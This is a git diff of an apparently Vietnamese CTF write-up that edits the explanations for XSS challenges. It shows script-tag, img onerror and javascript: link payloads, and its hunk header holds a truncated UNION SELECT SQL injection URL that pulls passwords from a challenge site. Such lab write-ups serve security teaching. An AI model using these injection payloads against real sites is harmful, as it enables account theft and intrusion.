@@ -56,20 +56,20 @@ https://64cntt1.ntucoder.net/CTF3/Product/?CategoryID=1 union select '1', passwo
 
 ###CTF6 - Hello
 - Chèn thẻ js 
-<script>alert("Đáp án: ")</script>
+<script>alert(1)</script>
 
 ----------
 
 ###CTF7 - Hello Again 
 - Chèn thẻ html để chèn hình ảnh
-<img src=x onerror=alert("Đáp án: ")>
+<img src=x onerror=alert(1)>
 *Giải thích:
 - Chèn một ảnh vào, giá trị x là một giá trị không hợp lệ (không phải URL ảnh thật).
-- onerror=alert("Đáp án: ") là một thuộc tính sự kiện (event handler) của thẻ <img>. 
+- onerror=alert(1) là một thuộc tính sự kiện (event handler) của thẻ <img>. 
 - Thuộc tính onerror được gọi khi trình duyệt không thể tải được ảnh (bị lỗi).
 
 - Chèn thẻ html gọi đến một js
-<a href="javascript:alert("Đáp án: ")">Lấy đáp án</a>
+<a href="javascript:alert(1)">Lấy đáp án</a>
 *Giải thích:
 - Chèn một link vào để người dùng tương tác.
 - javascript:alert("Đáp án: ") chạy trược tiếp js trong thẻ <a>
